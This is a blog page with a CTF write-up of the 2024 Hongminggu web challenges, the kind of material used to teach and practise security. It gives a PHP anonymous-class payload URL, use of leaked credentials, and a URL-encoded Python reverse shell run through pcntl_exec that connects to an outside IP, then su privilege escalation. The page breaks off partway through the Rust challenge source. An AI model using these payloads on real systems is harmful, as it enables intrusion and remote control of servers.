@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>红明谷-2024-Web - N1Rvana&#39;s Blog</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="Web Security" /><meta name="keywords" content='红明谷CTF Web' /><meta itemprop="name" content="红明谷-2024-Web">
+<meta itemprop="description" content=""><meta itemprop="datePublished" content="2024-04-03T18:26:39+08:00" />
+<meta itemprop="dateModified" content="2024-04-03T18:26:39+08:00" />
+<meta itemprop="wordCount" content="327"><meta itemprop="image" content="https://nlrvana.github.io/avatar.png" />
+<meta itemprop="keywords" content="红明谷CTF Web," /><meta property="og:title" content="红明谷-2024-Web" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nlrvana.github.io/%E7%BA%A2%E6%98%8E%E8%B0%B7-2024-web/" /><meta property="og:image" content="https://nlrvana.github.io/avatar.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-04-03T18:26:39+08:00" />
+<meta property="article:modified_time" content="2024-04-03T18:26:39+08:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://nlrvana.github.io/avatar.png" /><meta name="twitter:title" content="红明谷-2024-Web"/>
+<meta name="twitter:description" content=""/>
+<meta name="twitter:site" content="@huahua39079406"/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://nlrvana.github.io/%E7%BA%A2%E6%98%8E%E8%B0%B7-2024-web/" /><link rel="prev" href="https://nlrvana.github.io/ctf-babycodeigniter-web%E5%87%BA%E9%A2%98%E8%AE%B01/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "红明谷-2024-Web",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/nlrvana.github.io\/%E7%BA%A2%E6%98%8E%E8%B0%B7-2024-web\/"
+    },"genre": "posts","keywords": "红明谷CTF Web","wordcount":  327 ,
+    "url": "https:\/\/nlrvana.github.io\/%E7%BA%A2%E6%98%8E%E8%B0%B7-2024-web\/","datePublished": "2024-04-03T18:26:39+08:00","dateModified": "2024-04-03T18:26:39+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/categories/"
+                          
+                          
+                        ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/tags/"
+                          
+                          
+                        ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="关键词搜索" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="关键词搜索" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li
+              class="menu-item"
+            ><span class="nested-item">
+                  <a
+                    class="menu-link"
+                    href="/posts/"
+                    
+                    
+                  ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/categories/"
+                          
+                          
+                        ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/tags/"
+                          
+                          
+                        ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="N1Rvana&#39;s Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">红明谷-2024-Web</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>红明谷-2024-Web</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/avatar.png" data-title="N1Rvana" data-alt="N1Rvana" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;N1Rvana</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/ctf/" class="post-category" title="Category - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CTF</a></span></div><div class="post-meta-line"><span title="published on 2024-04-03 18:26:39"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-04-03">2024-04-03</time></span>&nbsp;<span title="327 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="红明谷-2024-Web">
+            <i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;views
+          </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#ezphp">ezphp</a></li>
+    <li><a href="#playground">playground</a></li>
+    <li><a href="#unauth">unauth</a></li>
+    <li><a href="#simp1escape">Simp1escape</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="ezphp" class="heading-element">
+  <a href="#ezphp" class="heading-mark"></a>ezphp</h2><div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>  
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="c1">// flag.php  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">hash_file</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]);</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">  
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用此篇文章的方法，读取文件<br>
+<a href="https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle"target="_blank" rel="external nofollow noopener noreferrer">https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle</a></p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ezphpPhp8&#39;</span><span class="p">]))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;No&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="k">class</span> <span class="err">{  </span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">getflag</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">};</span>  
+</span></span><span class="line"><span class="cl"><span class="nx">unset</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ezphpPhp8&#39;</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$f</span> <span class="o">=</span> <span class="k">new</span> <span class="nv">$a</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$f</span><span class="o">-&gt;</span><span class="na">getflag</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">  
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>匿名类的利用<br>
+<a href="https://hi-arkin.com/archives/php-anonymous-stdClass.html"target="_blank" rel="external nofollow noopener noreferrer">https://hi-arkin.com/archives/php-anonymous-stdClass.html</a><br>
+<code>/flag.php?ezphpPhp8=class%40anonymous%00/var/www/html/flag.php%3A7%240</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031633826.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031633826.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031633826.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031633826.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031633826.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031633826.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="playground" class="heading-element">
+  <a href="#playground" class="heading-mark"></a>playground</h2><p>访问<code>/www.zip</code>，得到</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[2022-01-01 12:34:56]  Authentication successful - User: admin Pass: 2e525e29e465f45d8d7c56319fe73036  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>替换<code>Authorization: Basic YWRtaW46MmU1MjVlMjllNDY1ZjQ1ZDhkN2M1NjMxOWZlNzMwMzY=</code><br>
+利用<code>readfile</code>得到<code>disable_function</code></p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl"><span class="na">eval,assert,fwrite,file_put_contents,phpinfo,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,lin,putenv,mail,chroot,chgrp,dl,readlink  </span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>pcntl_exec</code>没有被过滤，利用<code>Python</code>反弹<code>shell</code></p>
+<div class="highlight" id="id-5"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/?</span><span class="nx">cmd</span><span class="o">=</span><span class="nx">pcntl_exec</span><span class="p">(</span><span class="s1">&#39;/usr/bin/python&#39;</span><span class="p">,[</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span><span class="s1">&#39;%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%32%34%2e%32%32%30%2e%32%31%35%2e%38%22%2c%31%32%33%34%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%69%6d%70%6f%72%74%20%70%74%79%3b%20%70%74%79%2e%73%70%61%77%6e%28%22%73%68%22%29&#39;</span><span class="p">]);</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是<code>flag</code>为<code>admin</code>权限需要提权<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031615181.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031615181.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031615181.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031615181.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031615181.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031615181.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>
+在<code>config.inc.php</code>里面发现密码，但是并没有开启相关服务，<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031327074.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031327074.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031327074.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031327074.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031327074.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031327074.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>
+在<code>/etc/passwd</code>中发现<code>admin</code>用户，猜测可能密码复用，利用su进行提权<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031327939.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031327939.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031327939.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031327939.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031327939.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031327939.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="unauth" class="heading-element">
+  <a href="#unauth" class="heading-mark"></a>unauth</h2><div class="highlight" id="id-6"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="cp">#[macro_use]</span><span class="w"> </span><span class="k">extern</span><span class="w"> </span><span class="k">crate</span><span class="w"> </span><span class="n">rocket</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">fs</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">fs</span>::<span class="n">File</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">io</span>::<span class="n">Write</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">process</span>::<span class="n">Command</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">rand</span>::<span class="n">Rng</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cp">#[get(</span><span class="s">&#34;/&#34;</span><span class="cp">)]</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">index</span><span class="p">()</span><span class="w"> </span>-&gt; <span class="nb">String</span> <span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">fs</span>::<span class="n">read_to_string</span><span class="p">(</span><span class="s">&#34;main.rs&#34;</span><span class="p">).</span><span class="n">unwrap_or</span><span class="p">(</span><span class="nb">String</span>::<span class="n">default</span><span class="p">())</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cp">#[post(</span><span class="s">&#34;/rust_code&#34;</span><span class="cp">, data = </span><span class="s">&#34;&lt;code&gt;&#34;</span><span class="cp">)]</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">run_rust_code</span><span class="p">(</span><span class="n">code</span>: <span class="nb">String</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">String</span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">code</span><span class="p">.</span><span class="n">contains</span><span class="p">(</span><span class="s">&#34;std&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;Error: std is not allowed&#34;</span><span class="p">.</span><span class="n">to_string</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//generate a random 5 length file name  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">file_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rand</span>::<span class="n">thread_rng</span><span class="p">()</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">sample_iter</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rand</span>::<span class="n">distributions</span>::<span class="n">Alphanumeric</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">take</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="w">  
